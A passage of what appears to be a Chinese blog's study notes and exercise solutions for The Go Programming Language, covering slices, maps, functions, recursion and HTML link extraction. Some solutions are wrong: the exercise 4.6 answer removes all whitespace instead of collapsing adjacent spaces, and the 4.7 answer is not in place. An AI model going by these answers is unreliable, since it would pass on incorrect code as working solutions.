punctuation\">(</span><span class=\"token function\">uniqueSlice</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">uniqueSlice</span><span class=\"token punctuation\">(</span>strSlice <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span>\n\ttempStr <span class=\"token operator\">:=</span> <span class=\"token string\">\"\"</span>\n\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>strSlice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> tempStr <span class=\"token operator\">==</span> strSlice<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\t\tstrSlice <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>strSlice<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> strSlice<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token operator\">...</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token comment\">// 重复的话，长度要减一了</span>\n\t\t\ti<span class=\"token operator\">--</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\ttempStr <span class=\"token operator\">=</span> strSlice<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> strSlice\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>练习 4.6</h3>\n<p>编写一个函数，原地将一个UTF-8编码的[]byte类型的slice中相邻的空格（参考unicode.IsSpace）替换成一个空格返回</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\trs <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">rune</span><span class=\"token punctuation\">{</span><span class=\"token char\">'H'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'e'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'l'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'l'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'o'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token char\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token char\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'世'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'界'</span><span class=\"token punctuation\">}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"input string:\\t\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span>rs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tbs <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span><span class=\"token function\">string</span><span class=\"token punctuation\">(</span>rs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"output string:\\t\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token function\">uniqueSpaceSlice</span><span class=\"token punctuation\">(</span>bs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">uniqueSpaceSlice</span><span class=\"token punctuation\">(</span>bs <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span> <span class=\"token punctuation\">{</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"input []bytes:\\t\"</span><span class=\"token punctuation\">,</span> bs<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>bs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> unicode<span class=\"token punctuation\">.</span><span class=\"token function\">IsSpace</span><span class=\"token punctuation\">(</span><span class=\"token function\">rune</span><span class=\"token punctuation\">(</span>bs<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\tbs <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>bs<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> bs<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token operator\">...</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token comment\">// 如果是空格就删掉，删掉以后就会长度变短，i要减1</span>\n\t\t\ti<span class=\"token operator\">--</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"output []bytes:\\t\"</span><span class=\"token punctuation\">,</span> bs<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> bs\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h3>练习 4.7</h3>\n<p>修改reverse函数用于原地反转UTF-8编码的[]byte。是否可以不用分配额外的内存？</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\ts <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello 世界\"</span><span class=\"token punctuation\">)</span>\n\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span>bs <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">// 先把byte数组转成rune数组</span>\n\trunes <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">rune</span><span class=\"token punctuation\">(</span><span class=\"token function\">string</span><span class=\"token punctuation\">(</span>bs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token comment\">// 然后正常些，和原本的reverse函数一样</span>\n\t<span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> j <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>runes<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> j<span class=\"token punctuation\">;</span> i<span class=\"token punctuation\">,</span> j <span class=\"token operator\">=</span> i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> j<span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">{</span>\n\t\trunes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> runes<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> runes<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> runes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span><span class=\"token function\">string</span><span class=\"token punctuation\">(</span>runes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h2>4.3. map</h2>\n<p>在Go语言中，一个map就是一个哈希表的引用。map类型可以写为<code>map[K]V</code>，其中K和V分别对应key和value。map中所有的key都有相同的类型，所有的value也有着相同的类型，但是key和value之间可以是不同的数据类型。K对应的key必须是支持==比较运算符的数据类型，所以map可以通过测试key是否相等来判断是否已经存在。虽然浮点数类型也是支持相等运算符比较的，但key尽量不用浮点数，可能出现的NaN和任何浮点数都不相等。</p>\n<h3>操作map</h3>\n<p>内置的make函数可以创建一个map：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>ages := make(map[string]int) // mapping from strings to ints\n</code></pre></div><p>我们也可以用map字面值的语法创建map，同时还可以指定一些最初的key/value：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>ages := map[string]int{\n    \"alice\":   31,\n    \"charlie\": 34,\n}\n</code></pre></div><p>这相当于</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>ages := make(map[string]int)\nages[\"alice\"] = 31\nages[\"charlie\"] = 34\n</code></pre></div><p>因此，另一种创建空的map的表达式是<code>map[string]int{}</code>。</p>\n<p>使用内置的delete函数可以删除元素：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>delete(ages, \"alice\") // remove element ages[\"alice\"]\n</code></pre></div><p>即使这些元素不在map中也没有关系，如果一个查找失败将返回value类型对应的零值，例如</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func main() {\n\t//ages := make(map[string]int)\n\tages := map[string]int{\n\t\t\"alice\":   31,\n\t\t\"charlie\": 34,\n\t}\n\tagesBob := ages[\"bob\"]\n\tfmt.Println(agesBob) // 0\n\tages[\"bob\"] = ages[\"bob\"] + 1\n\tfmt.Println(ages[\"bob\"]) // 1\n\tfmt.Println(ages)        // map[alice:31 bob:1 charlie:34]\n}\n</code></pre></div><figure><figcaption>image-20240426180246893</figcaption></figure>\n<p>简短赋值语法也可以用在map上：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>ages[\"bob\"] += 1\nages[\"bob\"]++\n</code></pre></div><p>但是map中的元素并不是一个变量，因此我们不能对map的元素进行取址操作：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>_ = &amp;ages[\"bob\"] // compile error: cannot take address of map element\n</code></pre></div><p>禁止对map元素取址的原因是map可能随着元素数量的增长而重新分配更大的内存空间，从而可能导致之前的地址无效。</p>\n",
      "date_published": "2024-07-31T08:52:23.000Z",
      "date_modified": "2024-07-31T08:52:23.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "05. 函数",
      "url": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch5.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch5.html",
      "summary": "05. 函数\n5.1. 函数声明\n函数声明包括函数名、形式参数列表、返回值列表（可省略）以及函数体。\n\n形式参数列表描述了函数的参数名以及参数类型。这些参数作为局部变量，其值由参数调用者提供。\n返回值列表描述了函数返回值的变量名以及类型。如果函数返回一个无名变量或者没有返回值，返回值列表的括号是可以省略的。\n\n\nx和y是形参名，3和4是调用时的传入的实...",
      "content_html": "\n<h2>5.1. 函数声明</h2>\n<p>函数声明包括函数名、形式参数列表、返回值列表（可省略）以及函数体。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code> func name(parameter-list) (result-list) {\n     body\n }\n</code></pre></div><ul>\n<li>形式参数列表描述了函数的参数名以及参数类型。这些参数作为局部变量，其值由参数调用者提供。</li>\n<li>返回值列表描述了函数返回值的变量名以及类型。如果函数返回一个无名变量或者没有返回值，返回值列表的括号是可以省略的。</li>\n</ul>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code> func hypot(x, y float64) float64 {\n     return math.Sqrt(x*x + y*y)\n }\n fmt.Println(hypot(3,4)) // \"5\"\n</code></pre></div><ul>\n<li>x和y是形参名，3和4是调用时的传入的实参，函数返回了一个float64类型的值。</li>\n<li>每一次函数调用都必须<strong>按照声明顺序</strong>为所有参数提供实参（参数值）</li>\n<li>返回值也可以像形式参数一样被命名。在这种情况下，每个返回值被声明成一个局部变量，并根据该返回值的类型，将其初始化为该类型的零值。</li>\n<li>如果一个函数在声明时，包含返回值列表，该函数必须以 return语句结尾，除非函数明显无法运行到结尾处。例如函数在结尾时调用了panic异常或函数中存在无限循环。</li>\n</ul>\n<p>如果一组形参或返回值有相同的类型，我们不必为每个形参都写出参数类型。下面2个声明是等价的：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code> func f(i, j, k int, s, t string)                 { /* ... */ }\n func f(i int, j int, k int,  s string, t string) { /* ... */ }\n</code></pre></div><p>实参通过值的方式传递，因此函数的形参是实参的拷贝。对形参进行修改不会影响实参。但是，如果实参包括引用类型，如指针，slice(切片)、map、function、channel等类型，实参可能会由于函数的间接引用被修改。 你可能会偶尔遇到没有函数体的函数声明，这表示该函数不是以Go实现的。这样的声明定义了函数签名。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code> package math\n \n func Sin(x float64) float //implemented in assembly language\n</code></pre></div><h2>5.2. 递归</h2>\n<p>函数可以是递归的，这意味着函数可以直接或间接的调用自身。 如下main函数解析HTML标准输入，通过递归函数visit获得links（链接），并打印出这些links；visit 函数是一个递归函数，它遍历 html.Node 的每个子节点，并将找到的每个链接添加到 links 切片中。它首先检查节点是否为 <code>&lt;a&gt;</code>，并提取其 href 属性值，将其添加到 links 切片中。然后，它递归地为当前节点的每个子节点调用自身。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code> // Findlinks1 prints the links in an HTML document read from standard input.\n package main\n \n import (\n     \"fmt\"\n     \"os\"\n \n     \"golang.org/x/net/html\"\n )\n \n func main() {\n     doc, err := html.Parse(os.Stdin)\n     if err != nil {\n         fmt.Fprintf(os.Stderr, \"findlinks1: %v\\n\", err)\n         os.Exit(1)\n     }\n     for _, link := range visit(nil, doc) {\n         fmt.Println(link)\n     }\n }\n \n // visit appends to links each link found in n and returns the result.\n func visit(links []string, n *html.Node) []string {\n     if n.Type == html.ElementNode &amp;&amp; n.Data == \"a\" {\n         for _, a := range n.Attr {\n             if a.Key == \"href\" {\n                 links = append(links, a.Val)\n             }\n         }\n     }\n     for c := n.FirstChild; c != nil; c = c.NextSibling {\n         links = visit(links, c)\n     }\n     return links\n }\n \n</code></pre></div><figure><figcaption>image.png</figcaption></figure>\n<p>在函数outline中，我们通过递归的方式遍历整个HTML结点树，并输出树的结构。当outline调用自身时，被调用者接收的是stack的拷贝。被调用者对stack的元素追加操作，这个过程并不会修改调用方的stack。因此当函数返回时，调用方的stack与其调用自身之前完全一致。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code> package main\n \n import (\n     \"fmt\"\n     \"golang.org/x/net/html\"\n     \"os\"\n )\n \n func main() {\n     doc, err := html.Parse(os.Stdin)\n     if err != nil {\n         fmt.Fprintf(os.Stderr, \"outline: %v\\n\", err)\n         os.Exit(1)\n     }\n     outline(nil, doc)\n }\n \n // outline 通过递归的方式遍历整个HTML结点树，并输出树的结构。\n \n func outline(stack []string, n *html.Node) {\n     if n.Type == html.ElementNode {\n         stack = append(stack, n.Data) // push tag\n         fmt.Println(stack)\n     }\n     for c := n.FirstChild; c != nil; c = c.NextSibling {\n         outline(stack, c)\n     }\n }\n \n</code></pre></div><figure><figcaption>image.png</figcaption></figure>\n<p>大部分编程语言使用固定大小的函数调用栈，常见的大小从64KB到2MB不等。固定大小栈会限制递归的深度，当你用递归处理大量数据时，需要避免栈溢出；除此之外，还会导致安全性问题。与此相反，Go语言使用可变栈，栈的大小按需增加（初始时很小）。这使得我们使用递归时不必考虑溢出和安全问题。</p>\n<h3>练习 5.</h3>\n<p>修改findlinks代码中遍历n.FirstChild链表的部分，将循环调用visit，改成递归调用。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code> package main\n \n import (\n     \"fmt\"\n     \"os\"\n \n     \"golang.org/x/net/html\"\n )\n \n func main() {\n     doc, err := html.Parse(os.Stdin)\n     if err != nil {\n         fmt.Fprintf(os.Stderr, \"findlinks1: %v\\n\", err)\n         os.Exit(1)\n     }\n     for _, link := range visit(nil, doc) {\n         fmt.Println(link)\n     }\n }\n \n func visit(links []string, n *html.Node) []string {\n     if n.Type == html.ElementNode &amp;&amp; n.Data == \"a\" {\n         for _, a := range n.Attr {\n             if a.Key == \"href\" {\n                 links = append(links, a.Val)\n             }\n         }\n     }\n     // 原本的for循环单独拿出来，改成一个递归函数\n     return visitRecursion(links, n.FirstChild)\n \n }\n \n // visitRecursion 递归函数visitRecursion，用于遍历所有子节点\n func visitRecursion(links []string, c *html.Node) []string {\n     if c == nil {\n         return links\n     }\n     links = visit(links, c)\n     c = c.NextSibling\n     return visitRecursion(links, c)\n }\n \n</code></pre></div><figure><figcaption>image.png</figcaption></figure>\n<h3>练习 5.2</h3>\n<p>编写函数，记录在HTML树中出现的同名元素的次数。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code> <span class=\"token keyword\">package</span> main\n \n <span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n     <span class=\"token string\">\"fmt\"</span>\n     <span class=\"token string\">\"golang.org/x/net/html\"</span>\n     <span class=\"token string\">\"os\"</span>\n <span class=\"token punctuation\">)</span>\n \n <span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n     doc<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> html<span class=\"token punctuation\">.</span><span class=\"token function\">Parse</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stdin<span class=\"token punctuation\">)</span>\n     <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n         fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stderr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"outline: %v\\n\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n         os<span class=\"token punctuation\">.</span><span class=\"token function\">Exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n     <span class=\"token punctuation\">}</span>\n     counts <span class=\"token operator\">:=</span> <span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n     <span class=\"token function\">count</span><span class=\"token punctuation\">(</span>counts<span class=\"token punctuation\">,</span> doc<span class=\"token punctuation\">)</span>\n     <span class=\"token keyword\">for</span> tag<span class=\"token punctuation\">,</span> count <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> counts <span class=\"token punctuation\">{</span>\n         fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\t%d\\n\"</span><span class=\"token punctuation\">,</span> tag<span class=\"token punctuation\">,</span> count<span class=\"token punctuation\">)</span>\n     <span class=\"token punctuation\">}</span>\n <span class=\"token punctuation\">}</span>\n \n <span class=\"token comment\">// outline 通过递归的方式遍历整个HTML结点树，并输出树的结构。</span>\n <span class=\"token keyword\">func</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span>counts <span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> n <span class=\"token operator\">*</span>html<span class=\"token punctuation\">.</span>Node<span class=\"token punctuation\">)</span> <span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span> <span class=\"token punctuation\">{</span>\n     <span class=\"token keyword\">if</span> n<span class=\"token punctuation\">.</span>Type <span class=\"token operator\">==</span> html<span class=\"token punctuation\">.</span>ElementNode <span class=\"token punctuation\">{</span>\n         counts<span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">.</span>Data<span class=\"token punctuation\">]</span><span class=\"token operator\">++</span>\n     <span class=\"token punctuation\">}</span>\n     <span class=\"token keyword\">for</span> c <span class=\"token operator\">:=</span> n<span class=\"token punctuation\">.</span>FirstChild<span class=\"token punctuation\">;</span> c <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">;</span> c <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span>NextSibling <span class=\"token punctuation\">{</span>\n         <span class=\"token function\">count</span><span class=\"token punctuation\">(</span>counts<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span>\n     <span class=\"token punctuation\">}</span>\n     <span class=\"token keyword\">return</span> counts\n <span class=\"token punctuation\">}</span>\n \n</code></pre></div><figure><figcaption>image.png</figcaption></figure>\n<h3>练习 5.3</h3>\n<p>编写函数输出所有text结点的内容。注意不要访问<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code>元素，因为这些元素对浏览者是不可见的。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\n\t\"golang.org/x/net/html\"\n)\n\nfunc main() {\n\tdoc, err := html.Parse(os.Stdin)\n\tif err != nil {\n\t\tfmt.Fprintf(os.Stderr, \"findlinks1: %v\\n\", err)\n\t\tos.Exit(1)\n\t}\n\tgetTextContent(doc)\n}\n\nfunc getTextContent(n *html.Node) {\n\tif n.Type == html.ElementNode {\n\t\tif n.Data == \"script\" || n.Data == \"style\" {\n\t\t\treturn\n\t\t}\n\t}\n\tif n.Type == html.TextNode {\n\t\tfmt.Println(n.Data)\n\t}\n\tfor c := n.FirstChild; c != nil; c = c.NextSibling {\n\t\tgetTextContent(c)\n\t}\n}\n</code></pre></div><h3>练习 5.4</h3>\n<p>扩展visit函数，使其能够处理其他类型的结点，如images、scripts和style sheets。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>import (\"golang.org/x/net/html\")\n\nvar linkMap = map[string]string{\n\t\"a\":      \"href\", // a标签href属性\n\t\"img\":    \"src\",  // img标签src属性\n\t\"script\": \"src\",  // script标签src属性\n\t\"link\":   \"href\", // link标签href属性\n}\n\nfunc main() {\n\tfilePath := \"golang.org.html\"\n\tfile, err := os.Open(filePath)\n\tif err != nil {\n\t\t// 处理打开文件时的错误\n\t\tfmt.Println(\"无法打开文件:\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\tdoc, err := html.Parse(file)\n\t//doc, err := html.Parse(os.Stdin)\n\tif err != nil {\n\t\tfmt.Fprintf(os.Stderr, \"findlinks1: %v\\n\", err)\n\t\tos.Exit(1)\n\t}\n\tfor _, link := range visit(nil, doc) {\n\t\tfmt.Println(link)\n\t}\n}\n\nfunc visit(links []string, n *html.Node) []string {\n\tif n.Type == html.ElementNode &amp;&amp; linkMap[n.Data] != \"\" {\n\t\tfor _, a := range n.Attr {\n\t\t\tif a.Key == linkMap[n.Data] {\n\t\t\t\tlinks = append(links, a.Val)\n\t\t\t}\n\t\t}\n\t}\n\tfor c := n.FirstChild; c != nil; c = c.NextSibling {\n\t\tlinks = visit(links, c)\n\t}\n\treturn links\n}\n</code></pre></div><h2>5.3. 多返回值</h2>\n<p>下面的程序是findlinks的改进版本。因此findlinks声明了2个返回值：链接列表和错误信息。有4处return语句，每一处return都返回了一组值。前三处return，将http和html包中的错误信息传递给findlinks的调用者。第一处return直接返回错误信息，其他两处通过fmt.Errorf（§7.8）输出详细的错误信息。如果findlinks成功结束，最后的return语句将一组解析获得的连接返回给用户。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>package main\n\nimport (\n\t\"fmt\"\n\t\"golang.org/x/net/html\"\n\t\"net/http\"\n\t\"os\"\n)\n\nfunc main() {\n\tfor _, url := range os.Args[1:] {\n\t\tlinks, err := findLinks(url)\n\t\tif err != nil {\n\t\t\tfmt.Fprintf(os.Stderr, \"findlinks2: %v\\n\", err)\n\t\t\tcontinue\n\t\t}\n\t\tfor _, link := range links {\n\t\t\tfmt.Println(link)\n\t\t}\n\t}\n}\n\n// findLinks performs an HTTP GET request for url, parses the\n// response as HTML, and extracts and returns the links.\nfunc findLinks(url string) ([]string, error) {\n\tresp, err := http.Get(url)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tif resp.StatusCode != http.StatusOK {\n\t\tresp.Body.Close()\n\t\treturn nil, fmt.Errorf(\"getting %s: %s\", url, resp.Status)\n\t}\n\tdoc, err := html.Parse(resp.Body)\n\tresp.Body.Close()\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(\"parsing %s as HTML: %v\", url, err)\n\t}\n\treturn visit(nil, doc), nil\n}\n\nfunc visit(links []string, n *html.Node) []string {\n\tif n.Type == html.ElementNode &amp;&amp; n.Data == \"a\" {\n\t\tfor _, a := range n.Attr {\n\t\t\tif a.Key == \"href\" {\n\t\t\t\tlinks = append(links, a.Val)\n\t\t\t}\n\t\t}\n\t}\n\tfor c := n.FirstChild; c != nil; c = c.NextSibling {\n\t\tlinks = visit(links, c)\n\t}\n\treturn links\n}\n</code></pre></div><blockquote>\n<p>在findlinks中，我们必须确保resp.Body被关闭，释放网络资源。虽然Go的垃圾回收机制会回收不被使用的内存，但是这不包括操作系统层面的资源，比如打开的文件、网络连接。因此我们必须显式的释放这些资源。</p>\n</blockquote>\n<p>调用多返回值函数时，返回给调用者的是一组值，调用者必须显式的将这些值分配给变量:</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>links, err := findLinks(url)\n</code></pre></div><p>如果某个值不被使用，可以将其分配给blank identifier:</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>links, _ := findLinks(url) // errors ignored\n</code></pre></div><p>一个函数内部可以将另一个有多返回值的函数调用作为返回值(<code>return findLinks(url)</code>)：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>func findLinksLog(url string) ([]string, error) {\n    log.Printf(\"findLinks %s\", url)\n    return findLinks(url)\n}\n</code></pre></div><p>当你调用接受多参数的函数时，可以将一个返回多参数的函数调用作为该函数的参数。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>log.Println(findLinks(url))\nlinks, err := findLinks(url)\nlog.Println(links, err)\n</code></pre></div><p>如果一个函数所有的返回值都有显式的变量名，那么该函数的return语句可以省略操作数。这称之为bare return。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>// CountWordsAndImages does an HTTP GET request for the HTML\n// document url and returns the number of words and images in it.\nfunc CountWordsAndImages(url string) (words, images int, err error) {\n    resp, err := http.Get(url)\n    if err != nil {\n        return\n    }\n    doc, err := html.Parse(resp.Body)\n    resp.Body.Close()\n    if err != nil {\n        err = fmt.Errorf(\"parsing HTML: %s\", err)\n        